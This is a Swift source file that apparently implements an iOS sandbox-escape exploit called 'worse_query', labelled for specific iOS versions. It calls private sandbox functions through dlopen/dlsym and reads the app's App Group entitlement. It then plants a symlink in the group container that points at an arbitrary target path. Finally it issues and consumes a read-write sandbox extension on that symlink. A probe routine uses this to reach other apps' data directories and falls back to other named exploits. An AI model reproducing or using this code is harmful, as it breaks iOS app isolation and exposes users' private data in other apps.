import Foundation
import Darwin

func sandbox_extension_consume(_ token: String) -> Int64? {
    typealias Fn = @convention(c) (UnsafePointer<CChar>?) -> Int64
    guard let lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW) else { return nil }
    defer { dlclose(lib) }
    guard let sym = dlsym(lib, "sandbox_extension_consume") else { return nil }
    let fn = unsafeBitCast(sym, to: Fn.self)
    return fn(token)
}

func sandbox_extension_issue_file(path: String) -> String? {
    typealias Fn = @convention(c) (UnsafePointer<CChar>?, UnsafePointer<CChar>?, Int32, Int32) -> UnsafeMutablePointer<CChar>?
    guard let lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW) else { return nil }
    defer { dlclose(lib) }
    guard let sym = dlsym(lib, "sandbox_extension_issue_file") else { return nil }
    let fn = unsafeBitCast(sym, to: Fn.self)
    guard let ptr = fn("com.apple.app-sandbox.read-write", path, 0, 0) else { return nil }
    defer { free(ptr) }
    return String(cString: ptr)
}

// MARK: - worse_query (iOS 26.6.2 – 27.2+ App Group Symlink Sandbox Grant)

enum WorseQueryService {
    static func entitledAppGroups() -> [String] {
        typealias SecTaskCreateFromSelfFn = @convention(c) (CFAllocator?) -> AnyObject?
        typealias SecTaskCopyValueForEntitlementFn = @convention(c) (AnyObject, CFString, UnsafeMutablePointer<Unmanaged<CFError>?>?) -> AnyObject?

        guard let secLib = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW) else {
            return []
        }
        defer { dlclose(secLib) }
        guard let createSym = dlsym(secLib, "SecTaskCreateFromSelf"),
              let copySym = dlsym(secLib, "SecTaskCopyValueForEntitlement") else {
            return []
        }
        let createTask = unsafeBitCast(createSym, to: SecTaskCreateFromSelfFn.self)
        let copyEntitlement = unsafeBitCast(copySym, to: SecTaskCopyValueForEntitlementFn.self)

        guard let task = createTask(nil),
              let value = copyEntitlement(task, "com.apple.security.application-groups" as CFString, nil) as? [String] else {
            return []
        }
        return value.filter { !$0.isEmpty }
    }

    static var hasAppGroupEntitlement: Bool {
        !entitledAppGroups().isEmpty
    }

    static func grantAccess(to targetPath: String) -> Int64 {
        let groups = entitledAppGroups()
        guard let group = groups.first else {
            return -1
        }
        let bufferSize = 1024
        let rawBuf = UnsafeMutablePointer<CChar>.allocate(capacity: bufferSize)
        rawBuf.initialize(repeating: 0, count: bufferSize)
        defer { rawBuf.deallocate() }
        var bufPtr: UnsafeMutablePointer<CChar>? = rawBuf

        let groupHandle = group.withCString { cGroup in
            worse_query_group(cGroup, &bufPtr, Int32(bufferSize))
        }
        let groupContainerPath: String
        if rawBuf[0] != 0 {
            groupContainerPath = String(cString: rawBuf)
        } else if let url = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group) {
            groupContainerPath = url.path
        } else {
            if groupHandle >= 0 { bad_query_release(groupHandle) }
            log("worse_query: group container unavailable group=\(group)")
            return -1
        }

        let linkName = ".3105-wq-\(UUID().uuidString)"
        let linkPath = (groupContainerPath as NSString).appendingPathComponent(linkName)
        defer {
            unlink(linkPath)
            if groupHandle >= 0 { bad_query_release(groupHandle) }
        }

        guard symlink(targetPath, linkPath) == 0 else {
            log("worse_query: symlink failed target=\(targetPath) errno=\(errno)")
            return -1
        }
        guard let token = sandbox_extension_issue_file(path: linkPath),
              let consumed = sandbox_extension_consume(token),
              consumed >= 0 else {
            log("worse_query: issue target=\(targetPath) failed")
            return -1
        }
        return consumed
    }

    static func runProbe() -> String {
        let v = AppInfo.osVersion
        let groups = entitledAppGroups()
        log("probe start iOS \(v) entitled app groups: \(groups)")
        guard let firstGroup = groups.first else {
            return "no App Group entitlement — signer granted none, using bad_query / AirLift (LocalDevVPN + Pairing)"
        }
        let handle = grantAccess(to: "/private/var/mobile/Containers/Data/Application")
        if handle >= 0 {
            bad_query_release(handle)
            return "worse_query OK via App Group (\(firstGroup))"
        }
        return "worse_query group=\(firstGroup) probed; using AirLift / bad_query fallback"
    }
}
